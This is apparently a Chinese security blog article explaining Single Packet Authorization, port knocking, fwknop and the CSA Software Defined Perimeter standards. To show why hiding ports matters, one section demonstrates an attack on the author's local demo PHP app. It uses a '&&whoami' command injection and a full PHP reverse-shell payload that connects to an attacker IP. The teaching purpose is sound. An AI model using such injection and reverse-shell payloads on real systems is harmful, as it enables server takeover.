@@ -1,0 +1,515 @@
+## 目录
+
+1、前言
+
+2、什么是SPA
+
+2.1、开局一张图，见识一下SPA
+
+2.2、SPA-单包授权
+
+2.3、从应用认证说起
+
+2.3.1、一个极简的应用介绍  
+2.3.2、极简应用的正常使用流程  
+2.3.3、攻击者进行侦察  
+2.3.4、攻击者发现漏洞1—work.php存在越权漏洞  
+2.3.5、攻击者发现漏洞2-命令注入  
+2.3.6、攻击者通过组合漏洞反弹shell，成功控制服务器  
+2.3.7、小结-应用代码复杂化带来的漏洞挑战
+
+2.4、端口敲门(Port Knocking)
+
+2.4.1、Port Knocking的配置文件  
+2.4.2、Port Knocking的效果和价值  
+2.4.3、Port Knocking小结
+
+2.5、SPA(Single Packet Authorization)
+
+2.5.1、SPA的起源  
+2.5.2、fwknop  
+2.5.3、fwknop-SPA典型数据流  
+2.5.4、标准SPA的效果  
+2.5.5、标准SPA存在的核心不足  
+2.5.6、SPA VS Port Knocking
+
+3、SPA和CSA SDP
+
+3.1、CSA和SDP
+
+3.1.1、SDP  
+3.1.2、CSA
+
+3.2、SDP和SPA
+
+3.2.1、SDP高度依赖于SPA机制  
+3.2.2、CSA SDP是SPA理念和技术的应用者  
+3.2.3、SPA和SDP的关键时间线
+
+3.2.4、SDP 2.0标准相比SDP 1.0标准的关键变化
+
+4、小结
+
+## 0、前前言
+
+以前也时不时会在freebuf上看文章，但是一直没发过。忽然发现freebuf可以自由投稿。先把以前在同名公众号上写的原创内容，挑一部分发一下。
+
+后续新内容会考虑同步在freebuf上发送。
+
+## 1、前言
+
+近些年火热的零信任领域中，一直有零信任三大技术路线SIM的说法， SIM=SDP（Software Defined
+Perimeter,软件定义边界）+IAM（Identity and Access Management ,统一身份管理）+MSG（Micro
+Segmentation,微分段）。
+
+其中， SDP **主要解决**
+用户到业务的南北向访问安全，在近些年疫情、安全、零信任理念驱动等因素影响下，算是零信任领域中更为主要的赛道，大量厂商各显神通，都推出了SDP相关的产品方案。
+
+而SDP的关键特征，就是SPA *，可见其重要程度。*本系列则计划针对SPA进行一些解读，便于大家理解。
+
+注： 零信任理念并不在本系列中展开，后续考虑另设专题讨论。感兴趣的读者可以自行在网络上查找现有材料  
+[篇1：SPA-Learning-001-零信任之初步了解SPA和SDP-SPA](https://www.freebuf.com/articles/network/351869.html)  
+[篇2：SPA-Learning-002-零信任SDP之SPA的核心逻辑与代际之争](https://www.freebuf.com/articles/network/353462.html)
+
+[篇3-SPA-Learning-003-零信任SDP之SPA
+典型方案和技术原理](https://www.freebuf.com/articles/353463.html)
+
+[篇4-SPA-Learning-004-零信任SDP之SPA真的能防止DDOS吗？](https://www.freebuf.com/articles/network/353464.html)
+
+## 2、什么是SPA
+
+### 2.1、开局一张图，见识一下SPA
+
+![](https://image.3001.net/images/20221208/1670478050_639178e26c9ed47f36e5f.png!small)
+
+(图侵删)
+
+sorry，澄清一下， 这个是某知名搜索引擎提供的，绝非作者本意，证据如下。
+
+![](https://image.3001.net/images/20221208/1670478053_639178e59dcad0aacd8fc.png!small)
+
+当然我们也不能怪 **某度** ，因为我随后就用 **某歌** 进行了搜索，发现是相同的结果。
+
+![](https://image.3001.net/images/20221208/1670478057_639178e9119816bcd2a0c.png!small)
+
+### 2.2、SPA-单包授权
+
+很不幸，这次wiki上是 **找不到SPA单包授权的定义** 了（截止2022-06）。
+
+![](https://image.3001.net/images/20221208/1670478059_639178eb8a312b6524abe.png!small)
+
+直接给出一个参考定义如下：
+
+ **SPA((Single Packet Authorization,单包授权)** : 是一种 **保护服务端口免受攻击的特殊认证方式** ，即通过
+**一个单一数据包(Single Packet) **携带** 认证鉴别信息(Authentication) **从而在完成认证后获得**
+授权(Authorization)**，再允许访问业务。
+
+那么 **SPA到底是一种什么样的特殊认证** 呢？ **SPA的作用和价值** 是什么？
+
+### 2.3、从应用认证说起
+
+要理解SPA，就要先理解应用认证。 **应用认证**
+，是应用对使用者的身份进行鉴别的一种方式。通常体现为一个登录界面，要求用户输入相应账号密码（本文不详述，可见 [Auth-Learning-001-企业身份安全之认证安全](https://www.wolai.com/o6L85MFLKxb5KTtCfBYhJG.md
+"Auth-Learning-001-企业身份安全之认证安全")）：
+
+![](https://image.3001.net/images/20221208/1670478060_639178eceb29a0ee5abff.png!small)
+
+以下摘自 [HVV-Learning-006-应用安全和理解安全漏洞](https://www.wolai.com/q2iHjveP9ijB1Ac5f6zkdV.md
+"HVV-Learning-006-应用安全和理解安全漏洞")一文2.1.2章节，从应用安全（漏洞）的视角的相关描述。
+
+从应用视角出发 ，用户访问应用的过程如下：
+
+1)、 应用通常由 **一个运行环境承载，该运行环境称为** 系统
+(System)，该系统有可能是Docker，有可能是虚拟机操作系统，也有可能是物理操作系统，甚至可能还有其他类型（如serverless，此处不展开），可简单理解为操作系统。
+
+2)、针对(中)后台应用*，*
+多数都有认证授权，用户需要认证(Authentication)成功*、并按授权*(Authorization)正常访问应用。即使是前台应用，也有一部分是有认证授权的，如电子商城，用户只能看到自己的购买记录。
+
+3)、用户访问应用的过程，通常会被审计(Audit) 。
+
+4)、应用通常 **都有数据 ，存放在** 运行环境之中（根据实现的不同，可以是数据库服务、也可以是磁盘文件、甚至内存）。
+
+5)、应用（确切的说是网络类应用），都有对外暴露的端口（如8080、443、22、3389等），供用户访问其服务。
+
+![](https://image.3001.net/images/20221208/1670478062_639178ee85cb5027fc528.png!small)
+
+#### 2.3.1、一个极简的应用介绍
+
+为了给大家呈现清楚应用漏洞的危害，笔者花了30分钟学了一下php，手撸一个基于php的 **极简应用** 《运维诊断工作系统v8.0》给大家做一个示范。
+
+该系统采用php编写，一共有3个页面，分别为“登录页面”、“注销页面”、“工作页面”。如下图：
+
+![](https://image.3001.net/images/20221208/1670478063_639178efc0206d0490926.png!small)
+
+如下图，三个页面， 加起来一共111行代码。
+
+![](https://image.3001.net/images/20221208/1670478065_639178f13b299842aaa32.png!small)
+
+注：该应用属于内网本地编写的示例应用，非互联网应用。
+
+#### 2.3.2、极简应用的正常使用流程
+
+应用正常访问流程的gif动图录制如下：
+
+![](https://image.3001.net/images/20221208/1670478066_639178f274c704be54a38.gif!small)
+
+为防止gif不清晰，再以静态图进行讲解：
+
+1)、输入admin账号密码，进行登录。密码是复杂的一个随机的UUID，不可读、不可猜解。
+
+![](https://image.3001.net/images/20221208/1670478067_639178f3ee27ee388f79f.png!small)
+
+![](https://image.3001.net/images/20221208/1670478068_639178f4e16ecdf978416.png!small)
+
+![](https://image.3001.net/images/20221208/1670478069_639178f5d74fedaec06aa.png!small)
+
+2)、登录成功后，3秒跳转到工作台页面(work.php)。该页面提供功能为，输入一个IP，检查其网络连通性。检测成功页面如下：
+
+![](https://image.3001.net/images/20221208/1670478070_639178f6d0ac9dd5c2d56.png!small)
+
+#### 2.3.3、攻击者进行侦察
+
+参考 [HVV-Learning-003-浅析ATT&ck和Cyber Kill
+Chain](https://www.wolai.com/tUo82LchdWbUuwrbu7Negw.md "HVV-Learning-003-浅析ATT&ck和Cyber Kill Chain"),无论是Cyber-Kill-Chain还是ATT&CK框架，第一步都是侦察。下述为gif动图（如不清晰，可参考后附静态截图讲解）
+
+![](https://image.3001.net/images/20221208/1670478072_639178f84a14f10ccb0c1.gif!small)
+
+1)、攻击者在拿到站点后，先尝试弱密码，发现不成功。
+
+![](https://image.3001.net/images/20221208/1670478074_639178fa6712179331d4a.png!small)
+
+2)、攻击者随后通过dirb（一个根据字典文件，扫描站点目录的攻击工具）进行站点扫描，扫描出来了
+**index.php、work.php、logout.php** 三个文件。
+
+（注：字典在实际攻击过程中，可能会有所遗漏，导致扫描不全，本例中扫描出所有属于特例）。
+
+![](https://image.3001.net/images/20221208/1670478075_639178fb5309be6ae2609.png!small)
+
+#### 2.3.4、攻击者发现漏洞1—work.php存在越权漏洞
+
+攻击者发现存在越权漏洞（未授权即可访问work.php）
+
+![](https://image.3001.net/images/20221208/1670478076_639178fc9850a15847235.gif!small)
+
+参考 [HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全](https://www.wolai.com/kftgETZRVWCSyArL4BzQoP.md "HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全")中2.2.2章节的 **EPLR四大漏洞技术成因模型** ，属于 **L-代码逻辑
+&设计缺陷**引 发。
+
+>  **L-接口逻辑 &设计缺陷引发(Interface Logic&Design)**：接口之间的逻辑或者机制设计缺陷导致的相关异常，比如说
+> **认证可以被绕过、水平越权、垂直越权** 就属于 **逻辑或设计缺陷** 。
+
+ **攻击者** 直接输入`http://192.168.245.1/work.php`路径，可以直接访问工作页面，只是用户名为空，证实其存在未授权漏洞：
+
+![](https://image.3001.net/images/20221208/1670478077_639178fde678eb03c3287.png!small)
+
+#### 2.3.5、攻击者发现漏洞2-命令注入
+
+攻击者在work.php工作页面，发现输入IP地址未进行输入输出校验，从而可以进行命令注入。如下gif图（如果看不清，可以看随后截图讲解 ）
+
+![](https://image.3001.net/images/20221208/1670478079_639178ff2bae83660bdf6.gif!small)
+
+参考 [HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全](https://www.wolai.com/kftgETZRVWCSyArL4BzQoP.md "HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全")中2.2.2章节的 **EPLR四大漏洞技术成因模型** ，属于
+**P-参数校验缺陷引发** 。
+
+> P-协议/接口参数校验缺陷引发(Parameter
+> Verification)：各类和输入输出参数校验有关的漏洞，均包含于此，比如说sql注入漏洞、命令注入漏洞、目录穿越、文件上传漏洞等
+
+1)、输入正常IP，结果如下：
+
+![](https://image.3001.net/images/20221208/1670478081_63917901157d646844eb5.png!small)
+
+2)、尝试进行命令拼接，后面增加`&&whoami`。可以看到whoami被正常执行，且输出参数。
+
+注：whoami是一个查看当前登录用户的命令
+
+![](https://image.3001.net/images/20221208/1670478082_639179024e74d91560e47.png!small)
+
+#### 2.3.6、攻击者通过组合漏洞反弹shell，成功控制服务器
+
+基于本文前述两小节（2.3.4、2.3.5）发现的 **未授权访问漏洞**
++命令注入漏洞，攻击者成功实施了反弹shell攻击，成功控制了web服务器。(如gif不清晰，可看后面静态截图）
+
+![](https://image.3001.net/images/20221208/1670478084_63917904038c1259e653a.gif!small)
+
+1)、在攻击机监听8080端口，便于反弹shell上线
+
+![](https://image.3001.net/images/20221208/1670478085_63917905b159f252c12a1.png!small)
+
+2)、通过
+[http://192.168.245.1/work.php（未授权页面）进行RCE(Remote](http://192.168.245.1/work.php%EF%BC%88%E6%9C%AA%E6%8E%88%E6%9D%83%E9%A1%B5%E9%9D%A2%EF%BC%89%E8%BF%9B%E8%A1%8CRCE(Remote)Code
+Execution)命令注入以反弹shell，由于是php网站，采用php注入，其注入payload如下（192.168.139.1是攻击机的IP）：
+
+`127.0.0.1&&php -r '$sock=fsockopen("192.168.139.1",8080);exec("/bin/sh -i <&3
+>&3 2>&3");'`
+
+![](https://image.3001.net/images/20221208/1670478086_63917906c5006248f2c61.png!small)
+
+3)、 反弹shell上线，在攻击机上可以远程执行命令。通过whoami命令可以看到用户为(www-data)；通过ls可以看到目录下有3个文件，正在网站源代码。
+
+![](https://image.3001.net/images/20221208/1670478088_6391790802cbf126ebe7d.png!small)
+
+至此，从攻击效果上，已经完成了 [HVV-Learning-006-应用安全和理解安全漏洞](https://www.wolai.com/q2iHjveP9ijB1Ac5f6zkdV.md
+"HVV-Learning-006-应用安全和理解安全漏洞")一文中的2.2章节， LBCB **漏洞** 四大利用效果模型 **中的 C-控制应用与系统
+。后续可以想办法** 提权或进行其他攻击(如拖库、下载源代码进行审计等）。
+
+> ;控制(Control) - 控制应用与系统:
+> 通过获取到应用的特权（如管理员权限），或应用所运行外部系统（通常是服务器主机、docker容器等)的特权（如管理员权限、系统权限），既能够对系统进行进一步的窃取和破坏，也能够通过系统向其他应用、主机系统进行进一步的横向渗透。
+
+#### 2.3.7、小结-应用代码复杂化带来的漏洞挑战
+
+综上可以看到，一个111行代码的小程序，就发现了 **2个严重等级的漏洞 ，通过组合，能够实现** C-控制应用与系统 的漏洞利用效果。
+
+而且值得注意的是， 该程序的应用认证，在漏洞面前，形同虚设，攻击者可以直接绕开应用认证机制。
+
+正是印证了那句老话，只要有代码，就可能有漏洞。
+
+参考 [HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全](https://www.wolai.com/kftgETZRVWCSyArL4BzQoP.md "HVV-Learning-010-边界突破-浅谈对外暴露的安全设备/应用安全")第3.1章节，开源代码或企业自有代码，
+**平均每1000行就10个漏洞，其中1个高危漏洞** 。 **应用程序的业务越复杂，其代码规模非常复杂、代码行数就越多** ，漏洞风险就越高。
+
+总而言之，应用代码复杂化带来了巨大的漏洞挑战，有没有一个好的方式， **能既保障业务可访问，又能降低漏洞被攻击利用的可能** ？
+
+### 2.4、端口敲门(Port Knocking)
+
+ **端口敲门是SPA单包授权的前身** 。
+
+参考 wiki(https://en.wiki敏pedia感.org/wiki/Port_knocking)上的说明，端口敲门(Port
+Knocking)定义如下：
+
+端口敲门(Port Knocking): *在计算机网络中， **端口敲门** 是一种 **通过在一组预先指定的封闭** **端口**
+**上生成连接尝试来从外部打开**
+[*防火墙]([https://en.wiki敏pedia感.org/wiki/Firewall](https://en.xn--wikipedia-o65rk28a.org/wiki/Firewall)_(networking) "防火墙") **上的端口的方法**
+。一旦收到正确的连接尝试序列，防火墙规则就会动态修改，以允许发送连接的主机尝试通过特定端口进行连接。
+
+#### 2.4.1、Port Knocking的配置文件
+
+怎么理解呢？可以参考linux knockd的手册上的说明(<https://linux.die.net/man/1/knockd>)，有如下配置：
+
+![](https://image.3001.net/images/20221208/1670478089_639179094e368e625eb17.png!small)
+
+#### 2.4.2、Port Knocking的效果和价值
+
+开启Knockd后，指定端口默认不可以被访问。
+
+我们将上述保护端口22，改为80，如下：
+
+![](https://image.3001.net/images/20221208/1670478090_6391790a9713f3c87da07.png!small)
+
+如下图， **敲门前访问80端口失败；按顺序敲门后，访问80端口即可成功。**
+
+![](https://image.3001.net/images/20221208/1670478091_6391790bbb81d1da69187.png!small)
+
+1)、默认通过wget和telnet访问 80端口，访问不通。;
+
+![](https://image.3001.net/images/20221208/1670478092_6391790ce36e05987b9f2.png!small)
+
+ **2)、通过knock按7000、8000、9000的顺序发起敲门**
+
+![](https://image.3001.net/images/20221208/1670478093_6391790dd14013d4cf9c7.png!small)
+
+3)、敲门后，再进行访问，即可成功访问。;
+
+![](https://image.3001.net/images/20221208/1670478094_6391790ec7fdeb0541ca9.png!small)
+
+4)、查看 **受保护机器(172.19.32.5)的防火墙规则** ，发现如配置所设，添加了防火墙 规则：
+
+![](https://image.3001.net/images/20221208/1670478095_6391790fe2fd59fc044bb.png!small)
+
+5)、上述防火墙规则中，允许的`172.19.32.14`的IP，正是攻击机的IP。
+
+![](https://image.3001.net/images/20221208/1670478097_639179111d94f144e0a9d.png!small)
+
+#### 2.4.3、Port Knocking小结
+
+> 核心效果;
+
+1)、 应用漏洞防御*：即使应用有严重、高危的漏洞，攻击者只要没有获取到敲门机制（密码），也无法利用漏洞，无法分析、无法利用。起到了漏洞防御的作用*
+
+2)、DDOS攻击防护： 即使应用没有漏洞，攻击者也可能利用ddos泛洪攻击，将设备打崩溃、宕机，不能对外提供服务。
+
+> ;核心手段：;
+
+1)、端口隐藏 ：防火墙默认DROP所有数据包，所以攻击者无法扫描到端口存在。
+
+2)、基于IP的网络访问认证 *：在网络层，对访问进行认证（*虽然认证因素较弱，仅通过端口顺序），如果认证不通过。
+
+> ;存在不足：;
+
+1)、认证因素较弱，且容易暴露、伪造: 通过端口顺序约定敲门打开端口，因素较弱，且很容易暴露、伪造，安全性有所不足，防重放机制、加密保护均有缺失。
+
+2)、多包速度慢，可靠性不足：由于没有数据包内容，所以需要有多个敲门包通过顺序来控制，访问速度慢、也影响可靠性
+
+### 2.5、SPA(Single Packet Authorization)
+
+关于SPA单包授权说明，可参考fwknop （一个SPA的开源实现）
+Wiki（<http://www.cipherdyne.org/fwknop/docs/fwknop-tutorial.html#what-is-PK>）所定义如下：
+
+单数据包授权 （SPA） 的定义与端口敲门类似，不同之处在于， SPA
+不是仅使用数据包标头，而是在单个数据包的有效负载部分内传递身份验证信息*。由于使用了数据包有效负载，因此SPA提供了许多优于PK的增强功能*，例如更强的加密使用，防止重放攻击，最小的网络占用空间（就IDS可能发出警报而言
+- PK序列毕竟看起来像端口扫描），传输完整命令和复杂访问请求的能力以及更好的性能。
+
+#### 2.5.1、SPA的起源
+
+参考<http://www.cipherdyne.org/fwknop/docs/SPA.html>可知，SPA概念最早是由[Cipherdyne.org](http://Cipherdyne.org
+"Cipherdyne.org")创始人， Michael Rash
+**在2004年12月提出一种新的方法来保护基于IP的通信，将之称为“SPA单包授权”。**
+
+Michael Rash是一个安全研究员，在单包授权既是创始者也是持续研究者，参与了多篇SPA相关的数据讲座，也发布了多篇安全内容。
+
+SPA的开源版本 **fwknop** 也由Michael Rash及Cipherdyne.org实现并持续维护。
+
+![](https://image.3001.net/images/20221208/1670478098_639179125a3491a90c764.png!small)
+
+#### 2.5.2、fwknop
+
+fwknop(Firewall Knock Operator) **是一个SPA单包授权的开源实现，是** knockd(Port
+Knocking开源实现）更为安全和现代化的替代。
+
+#### 2.5.3、fwknop-SPA典型数据流
+
+ **fwknop** 分为 **客户端(spaclient)和服务端(spaserver)** 。参考下图：
+
+1)、单包敲门发起：spaclient向服务端(spaserver)发起单包敲门(SPA Packet）
+
+ **2)、认证校验并放开授权** ：spaserver校验SPA Packet后，放开client的公网源IP（本示例中为1.1.1.1）
+
+ **3)、正常访问应用：公网源IP所在终端（即敲门spaclient所在终端）可正常访问受保护应用** ，如SSH
+
+![](https://image.3001.net/images/20221208/1670478099_63917913b647c50e9f76f.png!small)
+
+注： 图源来自于 <https://www.cipherdyne.org/fwknop/docs/fwknop-tutorial.html>并进行少量标注修改。
+
+#### 2.5.4、标准SPA的效果
+
+如下图，可以看到通过SPA实现的效果其实和Port Knocking是基本一致的，均如下：
+
+1)、拒绝未敲门的终端（所对应的公网源IP）接入 ：攻击者和正常用户，如果不发起敲门，都不能接入。
+
+2)、仅允许已敲门的终端（所对应的公网源IP）接入 ：完成了SPA敲门的正常用户，才可以正常访问。
+
+![](https://image.3001.net/images/20221208/1670478101_63917915554ac7a56e202.png!small)
+
+#### 2.5.5、标准SPA存在的核心不足
+
+在2.5.3小节截图中，其实就已体现出了 **SPA敲门的关键不足** ， **敲门放大漏洞** 。
+
+ **如下图，可以看到** ，对于公网源IP相同的多个局域网终端，只要有任意一个终端敲门成功，其他终端即可以通过SPA校验访问业务。
+
+尤其是如果业务前面 **有经过CDN加速** ，会变成同一个源IP，导致只需要一个spaclient完成敲门，其他任意终端均可正常访问。
+
+![](https://image.3001.net/images/20221208/1670478102_63917916a35962c943d5e.png!small)
+
+除此之外， 为了隐藏端口*，*标准SPA均采用UDP带外敲门，除敲门放大漏洞外，还会存在一定不足：
+
+1)、UDP丢包风险：运营商对UDP是有一定的打压的，一般有QoS限速、丢包的可能，有可能UDP敲门包丢失，导致不能正常访问业务。
+
+2)、访问延迟相对较高：需要先发送一个UDP包，然后才能发起TCP连接访问业务。有时如果丢包，还需要重试，一定程度会影响业务访问体验。
+
+注：如果采用 **试图TCP进行SPA敲门， 由于SPA需要携带data数据内容，必须和服务端完成TCP三次握手，从而**
+导致端口无法隐藏，会被扫描探测出来 。
+
+#### 2.5.6、SPA VS Port Knocking
+
+综上，可以看出，SPA本质上也是端口敲门方案，只是在原敲门机制上做了一些优化改进。
+
+瑕不掩瑜，相比Port Knocking，SPA总体还是一个更优的方案。
+
+1)、SPA减少了敲门的次数，从而能提高体验和速度。
+
+2)、SPA相比PK,增加了数据包内容，能够携带加密数据 ，还能设置防重放机制，更安全。
+
+## 3、SPA和CSA SDP
+
+### 3.1、CSA和SDP
+
+#### 3.1.1、SDP
+
+参考CSA发布的《SDP标准规范1.0》（<https://c-csa.cn/u_file/photo/20200706/40c72deb73.pdf>），SDP定义如下：
+
+**SDP（Software Defined Premeter,软件定义边界）：SDP
+旨在使应用程序所有者能够在需要时部署安全边界，以便将服务与不安全的网络隔离开来。** **SDP 将物理设备替换为在应用程序所有者控制下运行的逻辑组件**
+。 SDP 仅在设备验证和身份验证后才允许访问企业应用基础架构。
+
+换成稍微容易理解的说明， **SDP旨在通过应用程序来控制网络边界，所以称之为"软件"定义边界。**
+
+相类似的有SDN（software-defined networking，软件定义网络）、SDS(Software Defined
+Storage，软件定义存储）等。
+
+#### 3.1.2、CSA
+
+参考https://en.wiki敏pedia感.org/wiki/Cloud_Security_Alliance,如下：
+
+CSA(Cloud_Security_Alliance，云安全联盟）是一个非营利组织，其使命是“促进使用最佳实践在云计算中提供安全保证，并提供有关使用云计算的教育，以帮助保护所有其他形式的计算。CSA
+
+CSA在中国设有大中华区 ，<https://c-csa.cn/>，负责参与相关标准制定、云安全相关的认证测评（比如说零信任CZTP专家认证）等工作。
+
+CSA在SDP方面，发布了标准1.0、标准2.0。
+
+### 3.2、SDP和SPA
+
+#### 3.2.1、SDP高度依赖于SPA机制
+
+CSA定义的SDP标准， 高度依赖于SPA*。SPA是SDP标准核心、关键且基础的特征*。
+
+参考csa官方解释（<https://c-csa.cn/mobile/research/results-detail/i-14/>），可以看到原始意图：
+
+SDP希望用 **安全隐身衣** 取代 **安全防弹衣** 保护目标，使 **攻击者在网络空间中看不到攻击目标而无法攻击 ，从而**
+使企业或服务商的资源受到保护 。;
+
+这里所述的安全隐身衣，即是指采用SPA理念机制进行隐身保护。
+
+#### 3.2.2、CSA SDP是SPA理念和技术的应用者
+
+CSA SDP是SPA理念和技术的应用者 ，而非缔造者。
+
+#### 3.2.3、SPA和SDP的关键时间线
+
+2004年12月，SPA概念被[Cipherdyne.org](http://Cipherdyne.org "Cipherdyne.org")创始人
+**Michael Rash** 提出。
+
+2005年，Cypherdyne.org在fwknop中开源首个SPA实现。
+
+2014年4月，CSA SDP工作组发布《SDP Specification
+1.0》，见：<https://downloads.cloudsecurityalliance.org/initiatives/sdp/SDP_Specification_1.0.pdf>
+
+2022年3月，CSA SDP工作组发布《Software-Defined Perimeter (SDP) Specification
+v2.0》，见：<https://cloudsecurityalliance.org/artifacts/software-defined-perimeter-zero-trust-specification-v2/>;
+
+### 3.2.4、SDP 2.0标准相比SDP 1.0标准的关键变化
+
+1)、扩展并明确了六大部署模式。主要是在客户端(client)、服务端(server)、网关(gateway)三者之间的不同组合构成，比如说client到server再到client，主要考虑用于P2P通信模式。
+包括物联网的支持
+
+注：实质上过度复杂的部署模式，在实际过程中很难用起来。但是作为标准，考虑完善一些是有必要的。
+
+![](https://image.3001.net/images/20221208/1670478104_63917918095ba01d549a8.png!small)
+
+ **2)、对SPA协议进行了扩展** ：SPA不再只是控制协议（用于网络隐身），还具备传输数据的能力。
+
+![](https://image.3001.net/images/20221208/1670478105_63917919c320b559b8a7e.png!small)
+
+ **3)、将TCP SPA加入到SDP标准中**
+：在2022年发布之前，实际上部分厂商已经实现了TCP的SPA，成为了事实标准，所以本次标准更新，将TCP SPA模式也加入其中。但是UDP
+SPA仍然是SDP主张的默认模式，因为UDP SPA有三大好处：
+
+3.1)、端口对攻击者完全隐藏：不答复TCP-SYN包，攻击者无法探测。
+
+3.2)、减缓DDOS攻击：不答复TCP-SYN包， **避免了恶意攻击者ddos带来的TCP/SSL建连开销**
+。注：实质上攻击者的DDOS效果，仍将取决于UDP SPA的校验开销。
+
+ **3.3)、首包攻击检测** ：tcp首包是通用包，但是UDP SPA首包敲门具备相应消息格式和加密、防重放机制，对于外部攻击能够快速探测识别。
+
+## 4、小结;
+
+1)、 **SPA的前身是Port Knocking** 。Port
+Knocking主张通过多个端口敲门的顺序（如依次敲击7000，8000，9000三个端口）来放开受保护的端口。
+
+2)、SPA起源早于CSA SDP标准，最早在2005年，由安全研究员Macheal Rash提出并发布了开源工程fwknop。
+
+3)、CSA SDP工作组在2014年发布SDP1.0标准，随后在2022年发布了SDP 2.0标准，SPA是SDP标准的核心特征。
+
+4)、应用漏洞难以消除，漏洞数量和开发者的安全意识、安全开发水平有很高相关性。
+
+5)、 **SPA意图通过在网络上对攻击者完全隐身，从而避免应用被攻击者侦察、分析、挖掘漏洞**
+，以及即使有漏洞，也避免漏洞被利用。这是SPA的核心价值，也是SDP主张的与传统网络架构的核心差异。
+
+===
+
